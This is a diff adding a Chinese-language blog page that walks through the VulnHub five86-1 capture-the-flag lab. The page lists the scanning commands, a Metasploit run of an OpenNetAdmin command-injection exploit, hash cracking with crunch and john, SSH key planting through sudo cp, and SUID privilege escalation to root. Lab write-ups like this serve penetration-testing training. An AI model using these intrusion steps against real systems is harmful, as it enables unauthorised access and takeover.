@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>VulnHub通关日记-five86-1-Walkthrough | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">VulnHub通关日记-five86-1-Walkthrough</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">February 12, 2020&nbsp;&nbsp;18:35:23</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Vulnhub/">Vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=29418950&auto=1&height=66"></iframe>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/five86-1,417/">https://www.vulnhub.com/entry/five86-1,417/</a><br>Name： five86: 1<br>靶机介绍：<br>Five86-1 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.<br>The ultimate goal of this challenge is to get root and to read the one and only flag.<br>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.<br>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到靶机 <code>IP</code> 后对它进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.1.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/984.png" alt="图片"></p>
+<p>靶机开放了 <code>22</code>、<code>80</code>、<code>10000</code> 三个端口。我们先看看 <code>web</code> 页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.134/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/985.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/986.png" alt="图片"></p>
+<p><code>web</code> 页面是空白的！那么我们对它目录进行扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.1.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/987.png" alt="图片"></p>
+<p>发现有这些目录文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.1.134/ ----</span><br><span class="line">+ http://192.168.1.134/index.html (CODE:200|SIZE:30)                                                                                                                                                        </span><br><span class="line">+ http://192.168.1.134/reports (CODE:401|SIZE:460)                                                                                                                                                          </span><br><span class="line">+ http://192.168.1.134/robots.txt (CODE:200|SIZE:29)                                                                                                                                                        </span><br><span class="line">+ http://192.168.1.134/server-status (CODE:403|SIZE:278)                                                                                                                                                                                                       </span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>
+
+<p>其中打开 <code>robots.txt</code> 文件后发现隐藏了这个目录：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/988.png" alt="图片"></p>
+<p>接着访问刚刚获取到的隐藏目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.134/ona/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/989.png" alt="图片"></p>
+<h2 id="OpenNetAdmin-命令注入获取SHELL"><a href="#OpenNetAdmin-命令注入获取SHELL" class="headerlink" title="OpenNetAdmin-命令注入获取SHELL"></a>OpenNetAdmin-命令注入获取SHELL</h2><p>打开后发现它是由 <code>OpenNetAdmin</code> （一个 IP 网络系统和主机管理系统）<code>CMS</code>，搜索了一下他的漏洞发现有一个<code>命令注入</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/990.png" alt="图片"></p>
+<p>随后我在 <code>exploit-db.com</code> 网站上找到了一个可以让 <code>Metasploit</code> 利用的脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.exploit-db.com/exploits/47772</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/991.png" alt="图片"></p>
+<p>下载完之后呢，我把他的 <code>Payload</code> 移动到 <code>MSF</code> 的利用模块目录里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/992.png" alt="图片"></p>
+<p>这个时候打开 <code>msfconsole</code> 就可以直接加载这个模块,设置攻击目标和攻击主机后直接运行得到一枚会话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/47772</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/993.png" alt="图片"></p>
+<p>获取到 <code>shell</code> 之后，我来到家目录发现了一个 <code>.htpasswd</code> 文件，打开后有一个账号和加密的密码，还有一段作者的提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www-data@five86-1:~$ cat .htpasswd</span><br><span class="line">cat .htpasswd</span><br><span class="line">douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1</span><br><span class="line"></span><br><span class="line"># To make things slightly less painful (a standard dictionary will likely fail),</span><br><span class="line"># use the following character set for this 10 character password: aefhrt </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/994.png" alt="图片"></p>
+<p>通过提示，靶机作者想让我们通过暴力破解的方式去枚举密码，而提示说密码是10个字符，其中包含字母 <code>aefhrt</code> ！</p>
+<h2 id="crunch-生成爆破字典"><a href="#crunch-生成爆破字典" class="headerlink" title="crunch-生成爆破字典"></a>crunch-生成爆破字典</h2><p>这个时候我们就需要使用 <code>KALI</code> 下的 <code>crunch</code> 去生成一个字典文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 aefhrt &gt; dic.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/995.png" alt="图片"></p>
+<h2 id="john-爆破密码"><a href="#john-爆破密码" class="headerlink" title="john-爆破密码"></a>john-爆破密码</h2><p>随后使用 <code>john</code> 破解密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=dic.txt pass</span><br><span class="line"># 使用john破解pass文件，字典是dic.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/996.png" alt="图片"></p>
+<p>经过漫长的破解，最后破解成功后密码为：<code>fatherrrrr</code> !</p>
+<p>拿到密码后 <code>ssh</code> 登陆它：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">douglas：fatherrrrr</span><br><span class="line">ssh douglas@192.168.1.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/997.png" alt="图片"></p>
+<h2 id="sudo-cp命令切换用户"><a href="#sudo-cp命令切换用户" class="headerlink" title="sudo-cp命令切换用户"></a>sudo-cp命令切换用户</h2><p>登陆之后我通过 <code>sudo -l</code> （习惯）发现可以以 <code>jen</code> 用户去执行 <code>cp</code> 命令（很明显了，作者就是想让我们登陆到 jen 这个用户才能完成靶机）：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/998.png" alt="图片"></p>
+<p>这个时候我们就可以先通过 <code>ssh-keygen</code> 来生成一个密钥，随后将生成的公钥拷贝到 <code>/home/jen/.ssh</code> ,这样就可以让我们登陆到 <code>jen</code> 这个用户！</p>
+<p>其实这种方式我之前的文章也写过，大家到我博客翻就可以找到～</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -b 2048</span><br><span class="line"># 生成 2048 比特字节的密钥</span><br><span class="line"></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_keys</span><br><span class="line"># 把生成的公钥复制到 /tmp/ 目录下并命名为：authorized_keys</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/999.png" alt="图片"></p>
+<p>这个时候我们来到 <code>/tmp</code>（临时目录）下给 <code>authorized_keys</code> 这个文件一个可执行权限，然后使用 <code>sudo</code> 以 <code>jen</code> 用户权限去执行 <code>cp</code> 命令，把我们刚刚生成的 <code>authorized_keys</code> 移动到 <code>/home/jen/.ssh/</code> 目录下，这样我们才能登陆它～</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 authorized_keys</span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1000.png" alt="图片"></p>
+<p>切换到 <code>jen</code> 用户后，我疯狂翻目录模式找到了一份邮件信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">From roy@five86-1 Wed Jan 01 03:17:00 2020</span><br><span class="line">Return-path: &lt;roy@five86-1&gt;</span><br><span class="line">Envelope-to: jen@five86-1</span><br><span class="line">Delivery-date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">Received: from roy by five86-1 with local (Exim 4.92)</span><br><span class="line">        (envelope-from &lt;roy@five86-1&gt;)</span><br><span class="line">        id 1imZBc-0001FU-El</span><br><span class="line">        for jen@five86-1; Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line">To: jen@five86-1</span><br><span class="line">Subject: Monday Moss</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=&quot;UTF-8&quot;</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Message-Id: &lt;E1imZBc-0001FU-El@five86-1&gt;</span><br><span class="line">From: Roy Trenneman &lt;roy@five86-1&gt;</span><br><span class="line">Date: Wed, 01 Jan 2020 03:17:00 -0500</span><br><span class="line"></span><br><span class="line">Hi Jen,</span><br><span class="line"></span><br><span class="line">As you know, I&#x27;ll be on the &quot;customer service&quot; course on Monday due to that incident on Level 4 with the accounts people.</span><br><span class="line"></span><br><span class="line">But anyway, I had to change Moss&#x27;s password earlier today, so when Moss is back on Monday morning, can you let him know that his password is now Fire!Fire!</span><br><span class="line"></span><br><span class="line">Moss will understand (ha ha ha ha).</span><br><span class="line"></span><br><span class="line">Tanks,</span><br><span class="line">Roy</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1001.png" alt="图片"></p>
+<p>其中邮件的内容包含了一个用户的账号和密码，我们使用得到的账号和密码登陆到了 <code>ssh</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER：moss</span><br><span class="line">PASS：Fire!Fire!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1002.png" alt="图片"></p>
+<p>登陆之后通过查看那些文件有 <code>SUID</code> 权限后发现有一个文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">moss@five86-1:~$ find /home -type f -perm -u=s 2&gt;/dev/null</span><br><span class="line">/home/moss/.games/upyourgame</span><br></pre></td></tr></table></figure>
+
+<p><code>SUID</code> 具体可以看看这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html">https://www.cnblogs.com/sparkdev/p/9651622.html</a></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1003.png" alt="图片"></p>
+<p>接着切换到那个文件的目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /home/moss/.games/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1004.png" alt="图片"></p>
+<p>最后运行 <code>upyourgame</code> 文件依次输入 <code>yes</code>、<code>no</code> 获取到 <code>root</code> 权限，最终在 <code>/root/</code> 目录下拿到 Flag～</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1005.png" alt="图片"></p>
+<h2 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h2><p>公众号：<code>saulGoodman</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/weixin/weixin.jpg" alt="saulGoodman"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/02/12/Vulnhub-five86-1/">http://example.com/2020/02/12/Vulnhub-five86-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        <a href="/tags/Vulnhub/"># Vulnhub</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/02/14/Vulnhub-five86-2/">VulnHub通关日记-five86-2-Walkthrough</a>
+            
+            
+            <a class="next" rel="next" href="/2020/02/11/Vulnhub-dpwwn-1/">VulnHub通关日记-dpwwn_1-Walkthrough，定时任务反弹SHELL拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
